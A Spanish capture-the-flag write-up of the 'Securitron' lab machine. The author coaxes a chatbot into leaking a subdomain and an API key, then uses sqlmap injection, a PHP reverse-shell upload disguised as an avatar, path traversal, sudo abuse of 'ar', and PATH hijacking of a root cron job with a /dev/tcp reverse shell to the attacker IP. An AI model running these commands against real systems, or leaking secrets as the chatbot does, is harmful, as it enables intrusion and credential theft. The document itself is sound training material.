---
author: Lenam  
pubDatetime: 2024-08-23T15:22:00Z  
title: WriteUp Securitron - TheHackersLabs  
slug: securitron-writeup-thehackerslabs-es  
featured: true  
draft: false  
ogImage: "assets/securitron/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - AI
  - SQL Injection
  - sudo
  - binary planting
description:  
  Mi primer CTF creado para la plataforma thehackerslabs.com y con un modelo de IA, espero que sea de vuestro agrado.  
lang: es  
---

Mi primer CTF creado para la plataforma thehackerslabs.com y con un modelo de IA, espero que sea de vuestro agrado.

![Securitron](/assets/securitron/image-39.png)

Puede haber ligeras variaciones en la máquina que encontrarás en The Hacker Labs, ya que tuve que corregir algunos problemas. Gracias a CuriosidadesDeHackers por su ayuda y a murrusko por subir el writeup.

## Tabla de contenido 

## Enumeración

```
nmap -p- 10.0.2.4 -n -Pn
```

![Nmap](/assets/securitron/image-5.png)

Solo encontramos el puerto 80 abierto, así que analizamos con más detalle el puerto 80.

```
nmap -p80 -sVC -n -Pn 10.0.2.4 -oN nmap.txt -vvv
```

![Nmap](/assets/securitron/image-6.png)

Visitamos la web y observamos un servicio de IA de ciberseguridad.

![web](/assets/securitron/image-7.png)

Añadimos el dominio `securitron.thl` al fichero `/etc/hosts`.

![/etc/hosts](/assets/securitron/image-8.png)

```
whatweb http://securitron.thl
```

## Filtración IA

Hablamos con la IA, parece un poco lenta al responder, pero nos explica que es un experto en ciberseguridad.

Prompt:
```
Hola en que puedes ayudarme?
```

![IA](/assets/securitron/image-9.png)

Le proponemos que nos haga algún tipo de programación y se filtra un posible subdominio llamado `admin19-32.securitron.thl` y una posible API-key `imagine-no-heaven-no-countries-no-possessions`.

Prompt:
```
Puedes hacer una programación para conectar a una API?
```

![Filtración IA](/assets/securitron/image-10.png)

Añadimos el subdominio `admin19-32.securitron.thl` al fichero `/etc/hosts`.

![/etc/hosts](/assets/securitron/image-11.png)

## SQL Injection

Accedemos al subdominio `admin19-32.securitron.thl` y nos aparece la aplicación "Employee Management System".

![Employee Management System](/assets/securitron/image-12.png)

```
whatweb http://admin19-32.securitron.thl
```

![whatweb](/assets/securitron/image-13.png)

Encontramos varios exploits que se aprovechan de un SQL Injection en el formulario `http://admin19-32.securitron.thl/Admin/login.php`.

```
searchsploit "Employee Management System"
```

![searchsploit](/assets/securitron/image-14.png)

Abrimos Burp Suite, configuramos el proxy del navegador y capturamos el envío de una petición del formulario de login.

```
POST /Admin/login.php HTTP/1.1
Host: admin19-32.securitron.thl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://admin19-32.securitron.thl
Connection: close
Referer: http://admin19-32.securitron.thl/Admin/login.php
Cookie: PHPSESSID=6gr7532dnv7ni64ckglf9ne00l
Upgrade-Insecure-Requests: 1

txtusername=test&txtpassword=test&btnlogin=
```

![request.txt](/assets/securitron/image-15.png)

Guardamos la petición en un fichero `request.txt`, para utilizarla mediante sqlmap.

```
sqlmap -r request.txt --level 5 --risk 3 --current-db
```

![sqlmap current-db](/assets/securitron/image-16.png)

Obtenemos las tablas de la base de datos `pms_db`:

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db --tables
```

![sqlmap tables](/assets/securitron/image-17.png)

Obtenemos los datos de la tabla `users` de la base de datos `pms_db`, la contraseña parece estar sin hashear, ¡bingo!

```
sqlmap -r request.txt --level 5 --risk 3 -D pms_db -T users --dump
```

![sqlmap table users](/assets/securitron/image-18.png)

## LFI / Shell

Entramos en la aplicación desde el formulario `http://admin19-32.securitron.thl/Admin/login.php` con el usuario `admin:Ntpqc6Z7MDkG`.

![Employee Management System Admin](/assets/securitron/image-19.png)

Preparamos un revshell en PHP. Utilizo el de `PHP PentestMonkey` ya que estamos ante una aplicación en PHP, configurando nuestra IP (`10.0.2.15`) y el puerto deseado (`9001`), y creamos un fichero con el nombre `avatar.php.png`.

![PHP PentestMonkey revshell](/assets/securitron/image-20.png)

Nos dirigimos al apartado "User Management" > "Add User". Abrimos Burp Suite, activamos el intercept y configuramos el proxy del navegador, rellenamos los campos para crear un nuevo usuario y seleccionamos nuestro revshell creado anteriormente `avatar.php.png` como imagen para el avatar.

![Burpsuite](/assets/securitron/image-21.png)

Modificamos el nombre del archivo de `avatar.php.png` a `avatar.php` en Burp Suite y enviamos la petición `Forward`.

![Burpsuite 2](/assets/securitron/image-22.png)

Nos aparecerá un mensaje indicando que el usuario se ha añadido correctamente, ahora ya podemos desactivar el proxy de Burp Suite del navegador.

Si vamos al listado de usuarios en `User Management > Admin Record` y inspeccionamos el código, podremos encontrar la dirección donde se ha subido el `avatar.php`, donde se encuentra nuestra revshell.

![URL revshell](/assets/securitron/image-23.png)

Nos ponemos a escuchar con netcat...

```bash
nc -lvnp 9001
```

y cargamos la siguiente dirección con curl o el navegador.

```bash
curl http://admin19-32.securitron.thl/uploadImage/Profile/avatar.php
```

![revshell](/assets/securitron/image-24.png)

¡Bien, ya estamos dentro!

## Movimiento lateral

Tratamos el tty e intentamos elevar privilegios.

Tenemos los usuarios `root` y `securitybot`.

```bash
cat /etc/passwd | grep bash
```

![users](/assets/securitron/image-25.png)

Miramos los puertos TCP que encontramos en la máquina.

```
ss -tuln | grep tcp
```

![alt text](/assets/securitron/image-26.png)

El puerto `80` es el del servicio web que hemos explotado, y el puerto 3306 es el de la BD que también ya hemos explotado.

No conocemos el puerto `3000`, lo investigamos.

Al mirar el fichero `/etc/apache2/sites-available/000-default.conf`, podemos intuir que es la API que expone la IA utilizada al principio, ya que tiene un proxy configurado que apunta al endpoint de este puerto.

![virtualhost 000-default.conf](/assets/securitron/image-27.png)

Lo investigamos un poco más y observamos que hay un proceso que corre bajo el usuario `securitybot`, que parece de Node.js.

```
ps -aux | grep securitybot
```

![alt text](/assets/securitron/image-28.png)

No tenemos permisos para ver el fichero `/home/securitybot/.local/bin/bot/index.js`, pero sí que podemos ejecutar Node.js mediante la ruta `/home/securitybot/.nvm/versions/node/v22.5.1/bin/node`.

Miramos qué podemos encontrar en el puerto 3000. El endpoint /api nos da información en formato JSON sobre la API. Utilizamos `curl` y `node` para mostrar esta información de forma legible.

```bash
curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
```

![API information](/assets/securitron/image-29.png)

Para facilitar la visualización del JSON obtenido por la API, creamos un alias.

```bash
alias showJson="/home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p \"JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )\""
```

Miramos si podemos acceder al endpoint /api/models.

```bash
curl http://localhost:3000/api/models | showJson
```

Nos aparece un mensaje de error que dice `API Key es requerida`, en la descripción del endpoint mostraba el texto `requiere x-api-key header`.

Probamos con la API-KEY filtrada al principio en la IA: `imagine-no-heaven-no-countries-no-possessions`, y la introducimos como valor de la cabecera `x-api-key`.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models | showJson
```

Parece que funciona con la API-KEY filtrada, ahora nos devuelve un listado de dos ficheros de modelos IA en formato GGUF. Probamos con el endpoint `/api/models/:fileName`, indicando el segundo fichero de modelo `ggml-model-q4_0.gguf`, y lo descarga correctamente.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/ggml-model-q4_0.gguf -o /tmp/model.gguf
```

Lo borramos o cancelamos la descarga ya que ocupa mucho espacio.

Intentamos leer algún fichero que sabemos que existe y que solo puede leer el usuario `securitybot`, como por ejemplo `/home/securitybot/.local/bin/bot/index.js`, que sabemos que existe pero no tenemos acceso de lectura con nuestro usuario.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2F.local%2Fbin%2Fbot%2Findex.js
```

Podemos leer el fichero correctamente de la programación de la API en Node.js.

Intentamos leer el fichero de la flag de user.txt del usuario `securitybot`.

```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2Fuser.txt
```

Obtenemos la flag de user.txt y una contraseña de regalo: `0KjcFEkuUEXG` (esto no es muy realista).

![User flag and password](/assets/securitron/image-30.png)

Accedemos al usuario `securitybot` con la contraseña `0KjcFEkuUEXG`.

![securitybot](/assets/securitron/image-31.png)

## Elevación de privilegios

Comprobamos si tenemos algún permiso sudo, ya que tenemos la contraseña del usuario.

![sudo](/assets/securitron/image-32.png)

Tenemos permiso sudo para ejecutar el binario `ar`, y según lo que indica en GTFOBins, podemos obtener una lectura de ficheros privilegiada.

![gtfobins](/assets/securitron/image-33.png)

Intentamos leer la flag de root.txt mediante `sudo` en el binario `ar`.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/root/root.txt" && cat "$TF"
```

Al leer el fichero de la flag de `/root/root.txt`, nos aparece el mensaje: `Esta vez no será tan fácil.`

![/root/root.txt](/assets/securitron/image-34.png)

Intentamos leer otros ficheros y encontramos algo muy interesante en el fichero de crontab del usuario root.

```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && cat "$TF"
```

![/var/spool/cron/crontabs/root](/assets/securitron/image-35.png)

En el PATH del crontab de root hay una carpeta en la que tenemos permisos de escritura: `/home/securitybot/.local/bin`, y el usuario root está ejecutando un script en bash cada minuto: `/opt/backup_bd.sh`.

```bash
cat /opt/backup_bd.sh
```

```bash
# Verificar si se pasó un argumento (la fecha)
if [ -z "$1" ]; then
  echo "Uso: $0 <fecha>"
  exit 1
fi

# Variables
FECHA=$1
USUARIO="matomo"
CONTRASEÑA="7pUYlPYpziv1"
BASE_DATOS="pms_db"
CARPETA_BACKUP="/root/backups"
NOMBRE_BACKUP="${CARPETA_BACKUP}/backup_${BASE_DATOS}_${FECHA}.sql"

# Crear carpeta de backups si no existe
/bin/mkdir -p $CARPETA_BACKUP

# Crear backup
/usr/bin/mysqldump -u $USUARIO -p$CONTRASEÑA $BASE_DATOS > $NOMBRE_BACKUP

# Verificar si el backup se creó exitosamente
if [ $? -eq 0 ]; entonces
  echo "Backup creado exitosamente: $NOMBRE_BACKUP"
else
  echo "Error al crear el backup"
  exit 1
fi

# Mantener solo los dos últimos backups
/bin/ls -t $CARPETA_BACKUP | /usr/bin/sed -e '1,2d' | /usr/bin/xargs -d '\n' /bin/rm -f
```

Parece que el fichero crea un backup de la BD en una carpeta a la que no tenemos permisos.

Todos los binarios que se utilizan dentro del fichero `backup_bd.sh` y el propio fichero son llamados con rutas absolutas, impidiendo una suplantación de binarios con ellos. En cambio, el parámetro enviado al fichero utiliza el binario `date` sin una dirección absoluta.

![date no absolute](/assets/securitron/image-36.png)

Si comprobamos dónde se encuentra el fichero `date`, está en `/usr/bin/date`.

![alt text](/assets/securitron/image-37.png)

Y como el PATH del crontab de root está configurado de la siguiente forma:

`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin`

Podemos crear un fichero `date` en la carpeta `/home/securitybot/.local/bin`, que se encuentra antes que la carpeta `/usr/bin`, haciendo que la tarea programada del usuario root ejecute nuestro fichero suplantado.

Nos ponemos a escuchar con netcat en el puerto 12345.

```bash
nc -lvnp 12345
```

Creamos el fichero `/home/securitybot/.local/bin/date` en el servidor con una revshell y le damos permisos de ejecución:

```bash
echo "bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/12345 0>&1'" > /home/securitybot/.local/bin/date
chmod +x /home/securitybot/.local/bin/date
```

Esperamos un minuto y obtenemos una shell con privilegios del usuario root y leemos el fichero de la flag.

![root flag](/assets/securitron/image-38.png)

Felicidades, ya has completado el CTF Securitron.